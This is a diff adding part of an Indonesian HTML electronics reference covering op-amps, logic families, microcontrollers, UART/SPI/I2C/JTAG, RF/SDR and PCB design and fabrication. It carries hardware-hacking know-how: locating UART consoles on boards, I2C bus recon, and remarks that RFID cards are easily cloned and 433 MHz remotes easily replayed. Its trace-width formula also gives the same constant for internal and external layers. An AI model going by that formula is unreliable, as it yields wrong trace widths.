+    <thead><tr><th>Konfigurasi</th><th>Gain</th><th>Kegunaan</th></tr></thead>
+    <tbody>
+      <tr><td>Inverting Amp</td><td>-R_f/R_in</td><td>Amplifikasi dengan inversi fase</td></tr>
+      <tr><td>Non-Inverting Amp</td><td>1 + R_f/R_g</td><td>Amplifikasi tanpa inversi</td></tr>
+      <tr><td>Voltage Follower</td><td>1 (0 dB)</td><td>Buffer impedansi tinggi → rendah</td></tr>
+      <tr><td>Summing Amp</td><td>-R_f/R_in</td><td>Mixer audio, DAC sederhana</td></tr>
+      <tr><td>Comparator</td><td>∞ (tanpa feedback)</td><td>Deteksi threshold, zero-crossing</td></tr>
+      <tr><td>Integrator</td><td>-1/(jωRC)</td><td>Mengintegrasikan sinyal (ADC sigma-delta)</td></tr>
+      <tr><td>Differentiator</td><td>-jωRC</td><td>Deteksi edge, rate-of-change</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Voltage Regulator</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Tipe</th><th>Cara Kerja</th><th>Efisiensi</th><th>Part Contoh</th></tr></thead>
+    <tbody>
+      <tr><td><strong>LDO Linear</strong></td><td>Dissipasi excess voltage sebagai panas</td><td>Rendah: η = V_out/V_in</td><td>LM1117, AMS1117, MIC5219</td></tr>
+      <tr><td><strong>Buck (Step-Down)</strong></td><td>Switching + induktor + kapasitor</td><td>Tinggi: 85–95%</td><td>LM2596, MP2307, TPS62xxx</td></tr>
+      <tr><td><strong>Boost (Step-Up)</strong></td><td>Switching dengan energi induktor</td><td>Tinggi: 80–92%</td><td>MT3608, LM2577, TPS61xxx</td></tr>
+      <tr><td><strong>Buck-Boost</strong></td><td>Input &lt; atau &gt; output</td><td>75–88%</td><td>LTC3115, TPS63xxx</td></tr>
+    </tbody>
+  </table></div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     4. ELEKTRONIKA DIGITAL
+═════════════════════════════════════════════ -->
+<div class="section" id="digital">
+  <div class="section-label">§ 04 — Digital</div>
+  <h2 class="section-title">Elektronika Digital</h2>
+
+  <h3>Logika Digital & Gerbang Logika</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Gerbang</th><th>Fungsi</th><th>Simbol Boolean</th><th>IC 74xx</th></tr></thead>
+    <tbody>
+      <tr><td>AND</td><td>1 jika semua input 1</td><td>Y = A·B</td><td>74HC08</td></tr>
+      <tr><td>OR</td><td>1 jika ada input 1</td><td>Y = A+B</td><td>74HC32</td></tr>
+      <tr><td>NOT (Inverter)</td><td>Membalik input</td><td>Y = Ā</td><td>74HC04</td></tr>
+      <tr><td>NAND</td><td>AND + NOT</td><td>Y = ̄(A·B)</td><td>74HC00</td></tr>
+      <tr><td>NOR</td><td>OR + NOT</td><td>Y = ̄(A+B)</td><td>74HC02</td></tr>
+      <tr><td>XOR</td><td>1 jika input berbeda</td><td>Y = A⊕B</td><td>74HC86</td></tr>
+      <tr><td>XNOR</td><td>XOR + NOT</td><td>Y = ̄(A⊕B)</td><td>74HC266</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Level Tegangan Logika</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Family</th><th>VCC</th><th>V_IH min</th><th>V_IL max</th><th>I_OH max</th></tr></thead>
+    <tbody>
+      <tr><td>TTL (LS)</td><td>5V</td><td>2.0V</td><td>0.8V</td><td>-0.4mA</td></tr>
+      <tr><td>CMOS (HC)</td><td>2–6V</td><td>3.5V @5V</td><td>1.0V @5V</td><td>-4mA</td></tr>
+      <tr><td>LVTTL</td><td>3.3V</td><td>2.0V</td><td>0.8V</td><td>-8mA</td></tr>
+      <tr><td>LVCMOS</td><td>3.3V / 1.8V</td><td>0.65×VCC</td><td>0.35×VCC</td><td>Varies</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="callout warn">
+    <div class="callout-title">⚠ Level Shifting</div>
+    Menghubungkan 5V output ke input 3.3V GPIO langsung = <strong>merusak MCU</strong>. Gunakan: voltage divider (R1/R2), level shifter (BSS138), atau resistor + dioda clamp ke VCC.
+  </div>
+
+  <h3>Flip-Flop & Register</h3>
+  <p>Elemen memori dasar logika digital:</p>
+  <ul>
+    <li><strong>D Flip-Flop:</strong> Output Q mengikuti input D di clock edge. Dasar register shift.</li>
+    <li><strong>SR Flip-Flop:</strong> Set/Reset. Dasar latch dan debouncer tombol.</li>
+    <li><strong>JK Flip-Flop:</strong> Toggle, Set, Reset — paling fleksibel.</li>
+    <li><strong>T Flip-Flop:</strong> Toggle di setiap clock — dasar binary counter.</li>
+  </ul>
+
+  <h3>ADC & DAC</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Tipe ADC</th><th>Kecepatan</th><th>Resolusi</th><th>Kegunaan</th></tr></thead>
+    <tbody>
+      <tr><td>SAR (Successive Approx)</td><td>Menengah (1 Msps)</td><td>8–16 bit</td><td>MCU built-in ADC, sensor</td></tr>
+      <tr><td>Delta-Sigma (ΔΣ)</td><td>Lambat (&lt;1 Msps)</td><td>16–24 bit</td><td>Audio, presisi tinggi, timbangan</td></tr>
+      <tr><td>Flash ADC</td><td>Sangat cepat (&gt;1 Gsps)</td><td>6–8 bit</td><td>Oscilloscope, SDR, radar</td></tr>
+      <tr><td>Dual-Slope</td><td>Sangat lambat</td><td>12–18 bit</td><td>Multimeter digital, tegangan stabil</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>PWM — Pulse Width Modulation</h3>
+  <p>Output digital yang merepresentasikan nilai analog melalui duty cycle. Hampir semua MCU punya timer PWM hardware.</p>
+  <div class="formula">V_avg = V_high × (T_on / T_period) = V_high × Duty_Cycle</div>
+  <p>Penggunaan: kontrol motor (kecepatan), LED dimmer, sinyal servo, DAC sederhana (PWM + filter RC).</p>
+</div>
+
+<!-- ════════════════════════════════════════════
+     5. MCU & SoC
+═════════════════════════════════════════════ -->
+<div class="section" id="mcu">
+  <div class="section-label">§ 05 — Mikrokontroler</div>
+  <h2 class="section-title">Mikrokontroler & SoC</h2>
+
+  <h3>Perbandingan Platform Populer</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Platform</th><th>Core</th><th>Clock</th><th>Flash/RAM</th><th>Connectivity</th><th>Use Case</th></tr></thead>
+    <tbody>
+      <tr><td><strong>ATmega328P</strong></td><td>AVR 8-bit</td><td>16 MHz</td><td>32K/2K</td><td>UART,SPI,I2C</td><td>Simple embedded, Arduino</td></tr>
+      <tr><td><strong>STM32F103</strong></td><td>ARM CM3 32-bit</td><td>72 MHz</td><td>128K/20K</td><td>UART,SPI,I2C,USB,CAN</td><td>General purpose, BadUSB</td></tr>
+      <tr><td><strong>STM32F4xx</strong></td><td>ARM CM4 32-bit</td><td>168 MHz</td><td>1M/192K</td><td>Full + Crypto,FPU</td><td>High perf, DSP, USB HS</td></tr>
+      <tr><td><strong>RP2040</strong></td><td>Dual ARM CM0+</td><td>133 MHz</td><td>ext/264K SRAM</td><td>UART,SPI,I2C,PIO</td><td>Raspberry Pi Pico, DMA tricks</td></tr>
+      <tr><td><strong>ESP32-S3</strong></td><td>Dual Xtensa LX7</td><td>240 MHz</td><td>16M ext/512K</td><td>WiFi,BT5,BLE,USB-OTG</td><td>IoT, WiFi hacking, BLE</td></tr>
+      <tr><td><strong>ESP32-C3</strong></td><td>RISC-V 32-bit</td><td>160 MHz</td><td>4M/400K</td><td>WiFi,BLE,USB-Serial</td><td>Low cost WiFi node</td></tr>
+      <tr><td><strong>nRF52840</strong></td><td>ARM CM4</td><td>64 MHz</td><td>1M/256K</td><td>BLE5,Thread,USB,NFC</td><td>BLE hacking, keystroke inject</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>SoC untuk Embedded Linux</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Platform</th><th>CPU</th><th>RAM</th><th>Connectivity</th><th>Use Case</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Raspberry Pi 4</strong></td><td>4× CM A72</td><td>1–8 GB</td><td>GbE,WiFi,BT,USB3</td><td>Full Linux, pentest platform</td></tr>
+      <tr><td><strong>Orange Pi Zero 2</strong></td><td>4× CM A53</td><td>512M–1G</td><td>WiFi,BT,GbE</td><td>Compact Linux node</td></tr>
+      <tr><td><strong>Banana Pi BPI-R3</strong></td><td>MT7986 (4C)</td><td>2 GB</td><td>Dual WiFi6,2×GbE,SFP</td><td>Router platform, OpenWRT</td></tr>
+      <tr><td><strong>Allwinner H3</strong></td><td>4× CM A7</td><td>512M–2G</td><td>100M Ethernet</td><td>Embedded Linux, DIY</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>GPIO & Peripheral Interface</h3>
+  <pre><code><span class="cm">/* Peripheral mapping tipikal STM32 */</span>
+<span class="var">PA0–PA15</span>  <span class="cm">: GPIO Port A (bisa dikonfigurasi sebagai ADC, Timer, dll)</span>
+<span class="var">USART1</span>    <span class="cm">: PA9 (TX), PA10 (RX)</span>
+<span class="var">SPI1</span>      <span class="cm">: PA5 (SCK), PA6 (MISO), PA7 (MOSI), PA4 (NSS)</span>
+<span class="var">I2C1</span>      <span class="cm">: PB6 (SCL), PB7 (SDA)</span>
+<span class="var">USB FS</span>    <span class="cm">: PA11 (D-), PA12 (D+)</span>
+<span class="var">JTAG</span>      <span class="cm">: PA13 (SWDIO), PA14 (SWCLK), PB3 (TDO), PA15 (TDI)</span>
+
+<span class="cm">/* Alternate Function (AF) harus dikonfigurasi di register MODER, AFRL/AFRH */</span></code></pre>
+</div>
+
+<!-- ════════════════════════════════════════════
+     6. PROTOKOL KOMUNIKASI
+═════════════════════════════════════════════ -->
+<div class="section" id="protokol">
+  <div class="section-label">§ 06 — Protokol Komunikasi</div>
+  <h2 class="section-title">Protokol Serial & Debug</h2>
+
+  <h3>UART — Universal Async Receiver/Transmitter</h3>
+  <p>Protokol paling sederhana, asinkron, point-to-point. Tidak ada clock line terpisah — kedua sisi harus agree pada baud rate.</p>
+  <div class="pin-diagram">
+    <span class="pin-name">TX</span> → <span class="pin-num">──────────→</span> <span class="pin-name">RX</span>  (device A ke device B)<br>
+    <span class="pin-name">RX</span> ← <span class="pin-num">──────────←</span> <span class="pin-name">TX</span>  (device B ke device A)<br>
+    <span class="pin-name">GND</span> ────────────── <span class="pin-name">GND</span>
+  </div>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Parameter</th><th>Nilai Umum</th><th>Catatan</th></tr></thead>
+    <tbody>
+      <tr><td>Baud rate</td><td>9600, 115200, 230400, 921600</td><td>Default console Linux: 115200</td></tr>
+      <tr><td>Data bits</td><td>8 (paling umum), 7, 5</td><td>—</td></tr>
+      <tr><td>Parity</td><td>None (paling umum), Even, Odd</td><td>—</td></tr>
+      <tr><td>Stop bits</td><td>1 (paling umum), 2</td><td>—</td></tr>
+      <tr><td>Konfigurasi default</td><td>8N1</td><td>8 data, No parity, 1 stop</td></tr>
+    </tbody>
+  </table></div>
+
+  <h4>Identifikasi UART di PCB (untuk Hardware Hacking)</h4>
+  <pre><code><span class="cm">1. Cari test point / header 3–4 pin berdekatan</span>
+<span class="cm">2. Gunakan multimeter: pin GND → 0V, VCC → 3.3/5V</span>
+<span class="cm">3. TX pin: saat boot ada logic toggling (oscilloscope/logic analyzer)</span>
+<span class="cm">4. TX tegangan idle = HIGH (VCC level), RX = resistor pull-up</span>
+<span class="cm">5. Hubungkan ke USB-UART (CP2102, CH340, FT232) dengan level yang sesuai</span>
+<span class="cm">6. minicom / screen / picocom pada Linux:</span>
+<span class="kw">screen</span> /dev/ttyUSB0 <span class="num">115200</span></code></pre>
+
+  <h3>SPI — Serial Peripheral Interface</h3>
+  <p>Protokol sinkron, full-duplex, master-slave. Kecepatan bisa mencapai puluhan MHz.</p>
+  <div class="pin-diagram">
+    <span class="pin-name">SCK</span>  (Clock)     — Master generate<br>
+    <span class="pin-name">MOSI</span> (Master Out) — Master → Slave<br>
+    <span class="pin-name">MISO</span> (Master In)  — Slave → Master<br>
+    <span class="pin-name">CS/SS</span> (Chip Select) — Active LOW, satu per slave
+  </div>
+  <p><strong>SPI Mode (CPOL/CPHA):</strong></p>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Mode</th><th>CPOL</th><th>CPHA</th><th>Clock Idle</th><th>Sample</th></tr></thead>
+    <tbody>
+      <tr><td>0</td><td>0</td><td>0</td><td>LOW</td><td>Rising edge</td></tr>
+      <tr><td>1</td><td>0</td><td>1</td><td>LOW</td><td>Falling edge</td></tr>
+      <tr><td>2</td><td>1</td><td>0</td><td>HIGH</td><td>Falling edge</td></tr>
+      <tr><td>3</td><td>1</td><td>1</td><td>HIGH</td><td>Rising edge</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>I2C — Inter-Integrated Circuit</h3>
+  <p>Dua kabel (SCL + SDA), multi-master multi-slave, tiap device punya alamat 7-bit atau 10-bit.</p>
+  <div class="pin-diagram">
+    <span class="pin-name">SCL</span> ── <span class="num">4.7kΩ</span> ── VCC  (pull-up wajib)<br>
+    <span class="pin-name">SDA</span> ── <span class="num">4.7kΩ</span> ── VCC  (pull-up wajib)<br>
+    <span class="cm">Speed: Standard (100kHz), Fast (400kHz), Fast+ (1MHz), HS (3.4MHz)</span>
+  </div>
+  <p>Protokol I2C address scan (untuk recon hardware):</p>
+  <pre><code><span class="cm"># Scan I2C bus dengan i2c-tools (Linux)</span>
+<span class="kw">i2cdetect</span> -y <span class="num">1</span>   <span class="cm"># bus 1 (/dev/i2c-1)</span>
+<span class="cm"># Output: grid address 0x00–0x7F, 'UU'=used, '--'=empty, hex=ditemukan</span>
+
+<span class="cm"># Baca register dari device address 0x48</span>
+<span class="kw">i2cget</span> -y <span class="num">1</span> <span class="num">0x48</span> <span class="num">0x00</span></code></pre>
+
+  <h3>JTAG — Joint Test Action Group</h3>
+  <p>Protokol debug hardware via IEEE 1149.1. Dapat mengakses CPU registers, memory, flash programming, dan boundary scan.</p>
+  <div class="pin-diagram">
+    <span class="pin-name">TCK</span>  — Test Clock<br>
+    <span class="pin-name">TMS</span>  — Test Mode Select (navigasi state machine TAP)<br>
+    <span class="pin-name">TDI</span>  — Test Data In<br>
+    <span class="pin-name">TDO</span>  — Test Data Out<br>
+    <span class="pin-name">TRST</span> — Test Reset (opsional, active LOW)
+  </div>
+
+  <h3>SWD — Serial Wire Debug</h3>
+  <p>Versi 2-pin dari JTAG dari ARM. Lebih ringkas, sama powerful untuk debug Cortex-M.</p>
+  <div class="pin-diagram">
+    <span class="pin-name">SWDIO</span> — Data In/Out (bidireksional)<br>
+    <span class="pin-name">SWCLK</span> — Clock<br>
+    <span class="pin-name">GND</span>   — Ground<br>
+    <span class="pin-name">VTREF</span> — Target voltage reference (opsional)
+  </div>
+
+  <h3>USB — Universal Serial Bus</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Standar</th><th>Kecepatan Max</th><th>Power</th><th>Konektor</th></tr></thead>
+    <tbody>
+      <tr><td>USB 1.1 LS/FS</td><td>12 Mbps</td><td>500mA @5V</td><td>Type-A/B</td></tr>
+      <tr><td>USB 2.0 HS</td><td>480 Mbps</td><td>500mA @5V</td><td>A/B/Mini/Micro</td></tr>
+      <tr><td>USB 3.2 Gen1</td><td>5 Gbps</td><td>900mA @5V</td><td>A/B/C</td></tr>
+      <tr><td>USB 3.2 Gen2×2</td><td>20 Gbps</td><td>3A @20V (PD)</td><td>Type-C</td></tr>
+    </tbody>
+  </table></div>
+  <p>Kabel USB 2.0: <code>VBUS(5V)</code>, <code>D-</code>, <code>D+</code>, <code>GND</code>. Sinyal diferensial D+/D- untuk noise immunity.</p>
+
+  <h3>CAN Bus</h3>
+  <p>Protokol robust untuk otomotif dan industri — diferensial (CAN_H, CAN_L), multi-master, hingga 1Mbps. Penting untuk automotive hacking dan robotika industri. Terminator 120Ω di kedua ujung bus wajib.</p>
+</div>
+
+<!-- ════════════════════════════════════════════
+     7. RF & WIRELESS
+═════════════════════════════════════════════ -->
+<div class="section" id="rf">
+  <div class="section-label">§ 07 — RF & Wireless</div>
+  <h2 class="section-title">RF & Wireless Communication</h2>
+
+  <h3>Konsep Dasar RF</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Parameter</th><th>Rumus/Keterangan</th></tr></thead>
+    <tbody>
+      <tr><td>Panjang gelombang</td><td><code>λ = c / f</code> (c = 3×10⁸ m/s)</td></tr>
+      <tr><td>Antena λ/4</td><td>Panjang = 75mm / f(GHz) — quarter-wave monopole</td></tr>
+      <tr><td>dBm</td><td>Power relatif terhadap 1mW: <code>P(dBm) = 10×log10(P/1mW)</td></tr>
+      <tr><td>Link budget</td><td>EIRP - Path Loss + Gain receiver = Signal di receiver</td></tr>
+      <tr><td>Sensitivity</td><td>Min signal level yang bisa di-decode (tipikal -100 dBm untuk LoRa)</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Modulasi</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Modulasi</th><th>Deskripsi</th><th>Aplikasi</th></tr></thead>
+    <tbody>
+      <tr><td>AM (DSB/SSB)</td><td>Amplitudo carrier dimodulasi</td><td>Radio broadcast, AIS</td></tr>
+      <tr><td>FM</td><td>Frekuensi carrier dimodulasi</td><td>Radio FM, WBFM</td></tr>
+      <tr><td>FSK/GFSK</td><td>Frekuensi shift antara simbol</td><td>Bluetooth, POCSAG, ISM devices</td></tr>
+      <tr><td>OOK (On-Off Keying)</td><td>Carrier ON=1, OFF=0</td><td>Remote 433MHz, 315MHz</td></tr>
+      <tr><td>ASK</td><td>Amplitudo beda untuk tiap simbol</td><td>RFID pasif, NFC</td></tr>
+      <tr><td>OFDM</td><td>Multi-carrier, anti-multipath</td><td>WiFi, LTE, DVB-T</td></tr>
+      <tr><td>BPSK/QPSK</td><td>Phase shift antar simbol</td><td>GPS, satelit, LoRa</td></tr>
+      <tr><td>LoRa (CSS)</td><td>Chirp Spread Spectrum</td><td>LPWAN, jarak jauh</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Protokol Wireless Populer</h3>
+  <div class="card-grid">
+    <div class="card">
+      <div class="card-head">2.4 GHz</div>
+      <div class="card-name">WiFi 802.11</div>
+      <p>b/g/n (2.4G), a/ac/ax (5G). OFDM, MIMO. Channels 1–13 (ID).</p>
+    </div>
+    <div class="card">
+      <div class="card-head">2.4 GHz</div>
+      <div class="card-name">Bluetooth 5</div>
+      <p>Classic + BLE. GFSK, FHSS. BLE: 40 channels, 2MHz spacing.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">Sub-GHz</div>
+      <div class="card-name">LoRaWAN</div>
+      <p>915/868/433 MHz (Asia Pasifik: AS923). SF7–SF12, BW 125/250kHz.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">13.56 MHz</div>
+      <div class="card-name">NFC / ISO14443</div>
+      <p>MIFARE Classic, DESFire, ISO14443A/B. Range &lt;10cm.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">125 kHz</div>
+      <div class="card-name">EM4100 / HID</div>
+      <p>Access control RFID lama. Manchester/biphase. Mudah diklon.</p>
+    </div>
+    <div class="card">
+      <div class="card-head">433/315 MHz</div>
+      <div class="card-name">ISM OOK/ASK</div>
+      <p>Remote garage, alarm, sensor wireless. Mudah di-replay.</p>
+    </div>
+  </div>
+
+  <h3>SDR — Software Defined Radio</h3>
+  <p>Hardware RF yang fungsi modulasi/demodulasi dilakukan oleh software. Ideal untuk SIGINT dan wireless security research.</p>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Hardware</th><th>Frekuensi</th><th>TX/RX</th><th>Bandwidth</th><th>Harga</th></tr></thead>
+    <tbody>
+      <tr><td><strong>RTL-SDR v3</strong></td><td>500kHz–1.75GHz</td><td>RX only</td><td>2.4 MHz</td><td>~$30</td></tr>
+      <tr><td><strong>HackRF One</strong></td><td>1MHz–6GHz</td><td>Half-duplex</td><td>20 MHz</td><td>~$300</td></tr>
+      <tr><td><strong>ADALM-PLUTO</strong></td><td>325MHz–3.8GHz</td><td>Full-duplex</td><td>56 MHz</td><td>~$100</td></tr>
+      <tr><td><strong>LimeSDR Mini</strong></td><td>10MHz–3.5GHz</td><td>Full-duplex</td><td>30.72 MHz</td><td>~$200</td></tr>
+      <tr><td><strong>USRP B210</strong></td><td>70MHz–6GHz</td><td>Full-duplex</td><td>56 MHz</td><td>~$1500</td></tr>
+    </tbody>
+  </table></div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     8. DESAIN PCB
+═════════════════════════════════════════════ -->
+<div class="section" id="pcb-design">
+  <div class="section-label">§ 08 — PCB Design</div>
+  <h2 class="section-title">Desain PCB Profesional</h2>
+
+  <h3>Alur Desain PCB</h3>
+  <pre><code><span class="label">ALUR DESAIN PCB:</span>
+
+<span class="num">1.</span> <span class="kw">Schematic Capture</span>
+   ├─ Gambar skematik di KiCad / Altium / EasyEDA
+   ├─ Assign footprint ke tiap simbol
+   └─ Run ERC (Electrical Rules Check)
+
+<span class="num">2.</span> <span class="kw">PCB Layout</span>
+   ├─ Import netlist dari schematic
+   ├─ Place komponen (critical first: IC, connector, power)
+   ├─ Route traces (power/ground first)
+   ├─ Pour copper ground plane
+   └─ Run DRC (Design Rules Check)
+
+<span class="num">3.</span> <span class="kw">Design Review</span>
+   ├─ Cek clearance: trace-to-trace, pad-to-pad
+   ├─ Verifikasi decoupling cap placement
+   ├─ Signal integrity check (panjang trace kritis)
+   └─ Thermal analysis (komponen berdaya tinggi)
+
+<span class="num">4.</span> <span class="kw">Gerber Generation</span>
+   ├─ Copper layers (F.Cu, B.Cu, inner layers)
+   ├─ Solder mask (F.Mask, B.Mask)
+   ├─ Silkscreen (F.Silkscreen, B.Silkscreen)
+   ├─ Drill file (.drl / Excellon)
+   └─ BOM + CPL (centroid/placement file)
+
+<span class="num">5.</span> <span class="kw">Fabrication</span>
+   ├─ Upload ke fab: JLCPCB, PCBWay, OSHPark
+   └─ Pilih: layer count, thickness, finish, color</code></pre>
+
+  <h3>Tools Desain PCB</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Software</th><th>Lisensi</th><th>Kelebihan</th><th>Cocok untuk</th></tr></thead>
+    <tbody>
+      <tr><td><strong>KiCad 8</strong></td><td>Free/Open Source</td><td>Full-featured, PCB scripting (Python), SPICE</td><td>Semua level, favorit komunitas</td></tr>
+      <tr><td><strong>EasyEDA</strong></td><td>Free (cloud)</td><td>Terintegrasi LCSC/JLCPCB, mudah pemula</td><td>Prototyping cepat</td></tr>
+      <tr><td><strong>Altium Designer</strong></td><td>Berbayar mahal</td><td>Industry standard, powerful rules</td><td>Profesional / industri</td></tr>
+      <tr><td><strong>Eagle</strong></td><td>Freemium</td><td>Library banyak, Autodesk eco</td><td>Hobbyist, Sparkfun/Adafruit</td></tr>
+      <tr><td><strong>gEDA / PCB</strong></td><td>Free</td><td>Fully FOSS, scriptable</td><td>Advanced Linux users</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Design Rules — Aturan Dasar</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Parameter</th><th>JLCPCB Standard</th><th>JLCPCB Advanced</th><th>Catatan</th></tr></thead>
+    <tbody>
+      <tr><td>Min trace width</td><td>0.127mm (5mil)</td><td>0.075mm (3mil)</td><td>Power trace lebih lebar</td></tr>
+      <tr><td>Min clearance</td><td>0.127mm (5mil)</td><td>0.075mm (3mil)</td><td>High voltage butuh lebih besar</td></tr>
+      <tr><td>Min drill size</td><td>0.3mm</td><td>0.15mm</td><td>Via terkecil</td></tr>
+      <tr><td>Min annular ring</td><td>0.15mm</td><td>0.1mm</td><td>Pad sekitar hole</td></tr>
+      <tr><td>Board thickness</td><td>1.6mm (default)</td><td>0.4–3.2mm</td><td>1.0mm untuk fleksibel</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Trace Width vs Current</h3>
+  <p>Lebar trace harus cukup untuk arus yang mengalir. Gunakan IPC-2221 calculator atau rumus:</p>
+  <div class="formula">W = (I / (k × ΔT^0.44))^(1/0.725) / (th × 0.0647)</div>
+  <p>Di mana k=0.048 (internal), 0.048 (external), ΔT = temperature rise (°C), th = thickness (oz).</p>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Arus (A)</th><th>Lebar Min External (1oz, ΔT=10°C)</th><th>Lebar Min Internal</th></tr></thead>
+    <tbody>
+      <tr><td>0.5A</td><td>0.30mm</td><td>0.50mm</td></tr>
+      <tr><td>1A</td><td>0.50mm</td><td>0.80mm</td></tr>
+      <tr><td>2A</td><td>0.90mm</td><td>1.50mm</td></tr>
+      <tr><td>3A</td><td>1.30mm</td><td>2.20mm</td></tr>
+      <tr><td>5A</td><td>2.00mm</td><td>3.50mm</td></tr>
+    </tbody>
+  </table></div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     9. LAYER & STACKUP
+═════════════════════════════════════════════ -->
+<div class="section" id="pcb-layer">
+  <div class="section-label">§ 09 — PCB Layers</div>
+  <h2 class="section-title">Layer, Stackup & Via Types</h2>
+
+  <h3>PCB Layer Types</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Layer</th><th>Fungsi</th></tr></thead>
+    <tbody>
+      <tr><td><strong>F.Cu / Top Copper</strong></td><td>Lapisan tembaga depan — komponen SMD utama</td></tr>
+      <tr><td><strong>B.Cu / Bottom Copper</strong></td><td>Lapisan tembaga belakang</td></tr>
+      <tr><td><strong>In1.Cu, In2.Cu ...</strong></td><td>Inner copper (PCB 4-layer+) — biasanya Power & GND plane</td></tr>
+      <tr><td><strong>F.Mask / B.Mask</strong></td><td>Solder mask — lapisan hijau/merah/biru yang menutupi tembaga</td></tr>
+      <tr><td><strong>F.Paste / B.Paste</strong></td><td>Stencil paste — untuk aperture solder paste SMD</td></tr>
+      <tr><td><strong>F.Silkscreen</strong></td><td>Label komponen, value, reference designator</td></tr>
+      <tr><td><strong>Edge.Cuts</strong></td><td>Kontur/outline PCB</td></tr>
+      <tr><td><strong>Courtyard</strong></td><td>Area eksklusif komponen, cegah overlap</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Stackup 4-Layer (Recommended)</h3>
+  <pre><code><span class="label">STACKUP 4-LAYER STANDAR:</span>
+┌─────────────────────────────────┐
+│  Layer 1: Signal (F.Cu)         │  ← Komponen, signal traces
+│  Prepreg (0.1mm)                │
+│  Layer 2: GND Plane (In1.Cu)    │  ← Ground plane solid
+│  Core (1.2mm)                   │
+│  Layer 3: Power Plane (In2.Cu)  │  ← VCC planes berbeda tegangan
+│  Prepreg (0.1mm)                │
+│  Layer 4: Signal (B.Cu)         │  ← Signal traces, komponen
+└─────────────────────────────────┘
+
+<span class="cm">Benefits:</span>
+<span class="cm">- GND plane solid = impedansi referensi stabil = SI lebih baik</span>
+<span class="cm">- EMI jauh lebih rendah dari 2-layer</span>
+<span class="cm">- Crosstalk minimal antara Layer 1 dan 4</span></code></pre>
+
+  <h3>Via Types</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Tipe Via</th><th>Deskripsi</th><th>Cost</th><th>Kegunaan</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Through-hole Via</strong></td><td>Menembus seluruh board</td><td>Standard</td><td>Koneksi antar layer umum</td></tr>
+      <tr><td><strong>Blind Via</strong></td><td>Dari outer ke inner layer saja</td><td>Mahal</td><td>High-density design, BGA</td></tr>
+      <tr><td><strong>Buried Via</strong></td><td>Antar inner layer, tidak menyentuh outer</td><td>Sangat mahal</td><td>HDI PCB, miniaturisasi ekstrem</td></tr>
+      <tr><td><strong>Micro Via</strong></td><td>Laser drill, diameter &lt;0.15mm</td><td>Premium</td><td>HDI, smartphone PCB</td></tr>
+      <tr><td><strong>Via-in-Pad</strong></td><td>Via di dalam pad komponen</td><td>Medium+</td><td>QFN, BGA thermal pad</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Copper Pour & Ground Plane</h3>
+  <p>Selalu isi area kosong dengan copper pour yang dihubungkan ke GND. Manfaat:</p>
+  <ul>
+    <li>Low-impedance return path untuk signal</li>
+    <li>Mengurangi EMI radiasi</li>
+    <li>Heatspreading untuk komponen panas</li>
+    <li>Mechanical stability (warp reduction)</li>
+  </ul>
+  <p>Gunakan <em>thermals</em> (spoke pad) untuk via dan pad THT agar mudah disolder. Gunakan <em>solid pour</em> untuk high-current atau thermal pad IC power.</p>
+
+  <h3>Differential Pair Routing</h3>
+  <p>Untuk USB D+/D-, Ethernet, PCIe, HDMI — trace harus:</p>
+  <ul>
+    <li>Panjang sama (matched length, maksimal ±0.1mm perbedaan)</li>
+    <li>Spacing konsisten (biasanya 2×W, di mana W = trace width)</li>
+    <li>Tidak melewati via jika mungkin</li>
+    <li>Impedansi target: USB=90Ω diff, Ethernet=100Ω diff, PCIe=85Ω diff</li>
+  </ul>
+</div>
+
+<!-- ════════════════════════════════════════════
+     10. FABRIKASI & ASSEMBLY
+═════════════════════════════════════════════ -->
+<div class="section" id="pcb-fab">
+  <div class="section-label">§ 10 — Fabrikasi</div>
+  <h2 class="section-title">Fabrikasi PCB & Assembly (PCBA)</h2>
+
+  <h3>Proses Fabrikasi PCB</h3>
+  <pre><code><span class="label">PROSES FABRIKASI (simplified):</span>
+
+<span class="num">1.</span> Laminate cutting dari FR4 (glass-epoxy) dengan copper foil
+<span class="num">2.</span> Inner layer imaging: film fotoresist + UV expose + etching
+<span class="num">3.</span> Layer lamination: press dengan suhu/tekanan tinggi
+<span class="num">4.</span> Drilling: mechanical drill (through-hole) / laser (micro via)
+<span class="num">5.</span> Plating: electroless copper deposit ke dinding hole
+<span class="num">6.</span> Outer layer imaging + etching
+<span class="num">7.</span> Solder mask apply (LPI — Liquid Photo Imageable)
+<span class="num">8.</span> Surface finish deposit
+<span class="num">9.</span> Silkscreen printing
